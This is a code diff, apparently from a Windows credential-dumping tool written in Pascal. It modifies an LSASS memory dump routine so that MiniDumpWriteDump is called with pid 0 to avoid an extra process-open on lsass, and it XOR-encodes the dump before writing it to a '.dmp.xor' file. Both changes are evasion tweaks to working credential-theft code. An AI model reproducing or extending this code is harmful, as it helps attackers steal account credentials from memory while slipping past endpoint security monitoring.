@@ -6,7 +6,7 @@ interface
 
 uses
   Classes, SysUtils,windows,
-  utils,ntdll;
+  utils,ntdll,uxor;
 
 const
   MiniDumpNormal         = $0000;
@@ -378,11 +378,16 @@ if processHandle<>thandle(-1) then
       dumpbuffer:=HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 128);
       log('calling MiniDumpWriteDump');
       MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
-      result := MiniDumpWriteDump(clone, pid, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
+      //lets try with pid=0 to avoid an non necessary ntopenprocess on lsass
+      //https://rastamouse.me/dumping-lsass-with-duplicated-handles/
+      result := MiniDumpWriteDump(clone, 0, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
+      if result=false then result := MiniDumpWriteDump(clone, pid, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
       if result=false then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)));
       //save dumpbuffer...
       log('bytesRead:'+inttostr(bytesRead ));
-      hFile := CreateFile(pchar(inttostr(pid)+'.dmp'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+      xorbytes(dumpbuffer,bytesread);
+      hFile := CreateFile(pchar(inttostr(pid)+'.dmp.xor'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+      log(inttostr(pid)+'.dmp.xor'+ ' written - key=FF',1);
       writefile(hfile,dumpBuffer^,bytesRead ,bytesRead,nil);
       closehandle(hfile);
       //
